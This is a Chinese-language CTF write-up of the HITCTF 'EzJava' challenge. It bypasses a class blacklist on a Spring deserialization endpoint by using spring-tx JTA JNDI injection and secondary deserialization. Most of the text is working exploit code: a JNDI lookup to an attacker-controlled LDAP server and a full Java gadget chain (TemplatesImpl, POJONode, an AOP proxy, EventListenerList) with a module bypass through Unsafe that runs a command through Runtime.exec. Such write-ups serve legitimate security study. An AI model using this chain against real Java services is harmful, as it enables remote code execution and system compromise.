# HITCTF-EzJava题解

  
  
&lt;!--more--&gt;  
## EzJava  
反序列化入口点  
```java  
//    
// Source code recreated from a .class file by IntelliJ IDEA    
// (powered by FernFlower decompiler)    
//    
    
package com.hitctf.controller;    
    
import com.hitctf.util.SecureObjectInputStream;    
import java.io.ByteArrayInputStream;    
import java.io.ObjectInputStream;    
import java.util.Base64;    
import org.springframework.web.bind.annotation.GetMapping;    
import org.springframework.web.bind.annotation.PostMapping;    
import org.springframework.web.bind.annotation.RequestParam;    
import org.springframework.web.bind.annotation.ResponseBody;    
import org.springframework.web.bind.annotation.RestController;    
    
@RestController    
public class IndexController {    
    @GetMapping({&#34;/&#34;})    
    @ResponseBody    
    public String home() {    
        return &#34;Welcome to HitCTF!&#34;;    
    }    
    
    @PostMapping({&#34;/unser&#34;})    
    @ResponseBody    
    public String unserialize(@RequestParam(&#34;data&#34;) String data) throws Exception {    
        ObjectInputStream ois = new SecureObjectInputStream(new ByteArrayInputStream(Base64.getDecoder().decode(data.getBytes())));    
        return ois.readObject().toString();    
    }    
}  
```  
waf  
```java  
//    
// Source code recreated from a .class file by IntelliJ IDEA    
// (powered by FernFlower decompiler)    
//    
    
package com.hitctf.util;    
    
import java.io.IOException;    
import java.io.InputStream;    
import java.io.ObjectInputStream;    
import java.io.ObjectStreamClass;    
    
public class SecureObjectInputStream extends ObjectInputStream {    
    static String[] blacklist = new String[]{&#34;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&#34;, &#34;com.fasterxml.jackson.databind.node.POJONode&#34;, &#34;javax.management.BadAttributeValueExpException&#34;, &#34;javax.swing.event.EventListenerList&#34;, &#34;java.security.SignedObject&#34;};    
    
    public SecureObjectInputStream(InputStream in) throws IOException {    
        super(in);    
    }    
    
    protected Class&lt;?&gt; resolveClass(ObjectStreamClass desc) throws IOException, ClassNotFoundException {    
        String name = desc.getName();    
    
        for(String black : blacklist) {    
            if (name.equals(black)) {    
                System.out.println(&#34;Invalid:&#34; &#43; desc.getName());    
                throw new ClassNotFoundException(desc.getName());    
            }    
        }    
    
        return super.resolveClass(desc);    
    }    
}  
```  
这里直接打`spring-tx`反序列化  
`org.springframework.transaction.jta.JtaTransactionManager#readObject`方法，这里存在JNDI注入，调用链如下  
![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202512090027166.png)
![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202512090028274.png)
![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202512090028807.png)
构造`Poc`，直接打RMI二次反序列化  
```java  
import javax.naming.InitialContext;    
import java.io.ByteArrayOutputStream;    
import java.io.ObjectOutputStream;    
import java.util.Base64;    
    
public class JNDI {    
    public static void main(String[] args) throws Exception {    
        InitialContext initialContext = new InitialContext();    
        initialContext.lookup(&#34;ldap://172.20.10.3:1389/Deserialize/FromFile/payload1.ser&#34;);    
    }    
    public static byte[] serialize(Object obj, boolean flag) throws Exception {    
        ByteArrayOutputStream baos = new ByteArrayOutputStream();    
        ObjectOutputStream oos = new ObjectOutputStream(baos);    
        oos.writeObject(obj);    
        oos.close();    
        if (flag) System.out.println(Base64.getEncoder().encodeToString(baos.toByteArray()));    
        return baos.toByteArray();    
    }    
}  
```  
SpringJDKRCE  
```java  
import javax.swing.event.EventListenerList;    
import java.io.ByteArrayOutputStream;    
import java.io.FileOutputStream;    
import java.io.ObjectOutputStream;    
import java.lang.reflect.Field;    
import javax.swing.undo.UndoManager;    
import java.util.Base64;    
import java.util.Vector;    
import java.util.ArrayList;    
import com.fasterxml.jackson.databind.node.POJONode;    
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;    
import sun.misc.Unsafe;    
import java.lang.reflect.Method;    
import javassist.ClassPool;    
import javassist.CtClass;    
import javassist.CtMethod;    
import org.springframework.aop.framework.AdvisedSupport;    
import javax.xml.transform.Templates;    
import java.lang.reflect.*;    
    
// --add-opens=java.base/sun.nio.ch=ALL-UNNAMED --add-opens=java.base/java.lang=ALL-UNNAMED --add-opens=java.base/java.io=ALL-UNNAMED --add-opens=jdk.unsupported/sun.misc=ALL-UNNAMED --add-opens java.xml/com.sun.org.apache.xalan.internal.xsltc.trax=ALL-UNNAMED --add-opens=java.base/java.lang.reflect=ALL-UNNAMED    
public class SpringRCE {    
    public static void main(String[] args) throws Exception{    
        // 删除writeReplace保证正常反序列化    
        try {    
            ClassPool pool = ClassPool.getDefault();    
            CtClass jsonNode = pool.get(&#34;com.fasterxml.jackson.databind.node.BaseJsonNode&#34;);    
            CtMethod writeReplace = jsonNode.getDeclaredMethod(&#34;writeReplace&#34;);    
            jsonNode.removeMethod(writeReplace);    
            ClassLoader classLoader = Thread.currentThread().getContextClassLoader();    
            jsonNode.toClass(classLoader, null);    
        } catch (Exception e) {    
        }    
    
        // 把模块强行修改，切换成和目标类一样的 Module 对象    
        ArrayList&lt;Class&gt; classes = new ArrayList&lt;&gt;();    
        classes.add(TemplatesImpl.class);    
        classes.add(POJONode.class);    
        classes.add(EventListenerList.class);    
        classes.add(SpringRCE.class);    
        classes.add(Field.class);    
        classes.add(Method.class);    
        new SpringRCE().bypassModule(classes);    
    
        // ===== EXP 构造 =====        byte[] code1 = getTemplateCode();    
        byte[] code2 = ClassPool.getDefault().makeClass(&#34;fushuling&#34;).toBytecode();    
    
        TemplatesImpl templates = new TemplatesImpl();    
        setFieldValue(templates, &#34;_name&#34;, &#34;xxx&#34;);    
        setFieldValue(templates, &#34;_bytecodes&#34;, new byte[][]{code1, code2});    
        setFieldValue(templates,&#34;_transletIndex&#34;,0);    
    
        POJONode node = new POJONode(makeTemplatesImplAopProxy(templates));    
        EventListenerList eventListenerList = getEventListenerList(node);    
        serialize(eventListenerList, true);    
    }    
    
    public static byte[] serialize(Object obj, boolean flag) throws Exception {    
        ObjectOutputStream oos1 = new ObjectOutputStream(new FileOutputStream(&#34;payload1.ser&#34;));    
        oos1.writeObject(obj);    
    
        ByteArrayOutputStream baos = new ByteArrayOutputStream();    
        ObjectOutputStream oos = new ObjectOutputStream(baos);    
        oos.writeObject(obj);    
        oos.close();    
        if (flag) System.out.println(Base64.getEncoder().encodeToString(baos.toByteArray()));    
        return baos.toByteArray();    
    }    
    
    public static Object makeTemplatesImplAopProxy(TemplatesImpl templates) throws Exception {    
        AdvisedSupport advisedSupport = new AdvisedSupport();    
        advisedSupport.setTarget(templates);    
        Constructor constructor = Class.forName(&#34;org.springframework.aop.framework.JdkDynamicAopProxy&#34;).getConstructor(AdvisedSupport.class);    
        constructor.setAccessible(true);    
        InvocationHandler handler = (InvocationHandler) constructor.newInstance(advisedSupport);    
        Object proxy = Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(), new Class[]{Templates.class}, handler);    
        return proxy;    
    }    
    public static byte[] getTemplateCode() throws Exception {    
        ClassPool pool = ClassPool.getDefault();    
        CtClass template = pool.makeClass(&#34;MyTemplate&#34;);    
        String block = &#34;Runtime.getRuntime().exec(\&#34;open -a Calculator\&#34;);&#34;;    
        template.makeClassInitializer().insertBefore(block);    
        return template.toBytecode();    
    }    
    
    public static EventListenerList getEventListenerList(Object obj) throws Exception{    
        EventListenerList list = new EventListenerList();    
        UndoManager undomanager = new UndoManager();    
    
        //取出UndoManager类的父类CompoundEdit类的edits属性里的vector对象，并把需要触发toString的类add进去。    
        Vector vector = (Vector) getFieldValue(undomanager, &#34;edits&#34;);    
        vector.add(obj);    
        setFieldValue(list, &#34;listenerList&#34;, new Object[]{Class.class, undomanager});    
        return list;    
    }    
    
    private static Method getMethod(Class clazz, String methodName, Class[]    
            params) {    
        Method method = null;    
        while (clazz!=null){    
            try {    
                method = clazz.getDeclaredMethod(methodName,params);    
                break;    
            }catch (NoSuchMethodException e){    
                clazz = clazz.getSuperclass();    
            }    
        }    
        return method;    
    }    
    private static Unsafe getUnsafe() {    
        Unsafe unsafe = null;    
        try {    
            Field field = Unsafe.class.getDeclaredField(&#34;theUnsafe&#34;);    
            field.setAccessible(true);    
            unsafe = (Unsafe) field.get(null);    
        } catch (Exception e) {    
            throw new AssertionError(e);    
        }    
        return unsafe;    
    }    
    public void bypassModule(ArrayList&lt;Class&gt; classes){    
        try {    
            Unsafe unsafe = getUnsafe();    
            Class currentClass = this.getClass();    
            try {    
                Method getModuleMethod = getMethod(Class.class, &#34;getModule&#34;, new    
                        Class[0]);    
                if (getModuleMethod != null) {    
                    for (Class aClass : classes) {    
                        Object targetModule = getModuleMethod.invoke(aClass, new    
                                Object[]{});    
                        unsafe.getAndSetObject(currentClass,    
                                unsafe.objectFieldOffset(Class.class.getDeclaredField(&#34;module&#34;)), targetModule);    
                    }    
                }    
            }catch (Exception e) {    
            }    
        }catch (Exception e){    
            e.printStackTrace();    
        }    
    }    
    
    public static Object getFieldValue(Object obj, String fieldName) throws Exception {    
        Field field = null;    
        Class c = obj.getClass();    
        for (int i = 0; i &lt; 5; i&#43;&#43;) {    
            try {    
                field = c.getDeclaredField(fieldName);    
            } catch (NoSuchFieldException e) {    
                c = c.getSuperclass();    
            }    
        }    
        field.setAccessible(true);    
        return field.get(obj);    
    }    
    
    public static void setFieldValue(Object obj, String field, Object val) throws Exception {    
        Field dField = obj.getClass().getDeclaredField(field);    
        dField.setAccessible(true);    
        dField.set(obj, val);    
    }    
}  
```  
![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202512090030629.png)  
  

---

> Author: N1Rvana  
> URL: http://localhost:1313/hitctf-ezjava%E9%A2%98%E8%A7%A3/  

